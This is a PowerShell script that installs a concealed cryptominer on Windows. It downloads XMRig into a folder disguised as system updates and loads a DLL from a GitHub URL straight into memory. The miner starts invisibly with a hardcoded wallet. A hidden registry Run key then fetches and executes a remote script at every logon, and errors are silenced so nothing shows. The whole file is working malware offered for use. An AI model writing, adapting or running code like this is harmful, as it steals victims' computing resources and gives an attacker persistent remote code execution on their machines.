# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "btcminer-"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$MinerUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
$Wallet = "bc1qvq0rd2g29g3dpvw9mue0q3c4cvnsuxvwc4tqxr"

# --- STEALTH SETUP ---
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$ZipPath = Path.Combine($StealthDir, "update.zip")
$ExePath = Path.Combine($StealthDir, "xmrig.exe")

try {
    # Download and Unzip if not already there
    if (-not (Test-Path $ExePath)) {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($MinerUrl, $ZipPath)
        Expand-Archive -Path $ZipPath -DestinationPath $StealthDir -Force
        Remove-Item $ZipPath -Force
        
        # Rename the unzipped exe to our stealth name
        $UnzippedExe = Get-ChildItem -Path $StealthDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
        Move-Item $UnzippedExe.FullName -Destination $ExePath -Force
    }

    # --- REFLECTIVE LOADING ---
    $wc = New-Object System.Net.WebClient
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetType("DateFundLoader")
    $startMethod = $loader.GetMethod("StartMiner")
    
    # Start the miner via the DLL invisibly
    $startMethod.Invoke($null, @($ExePath, $Wallet))
    
    # --- PERSISTENCE ---
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Name = "WinSysUpdater"
    $Value = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iwr -useb https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1 | iex`"" 
    Set-ItemProperty -Path $RegPath -Name $Name -Value $Value
    
} catch {
    # Fail silently to keep under the radar
}
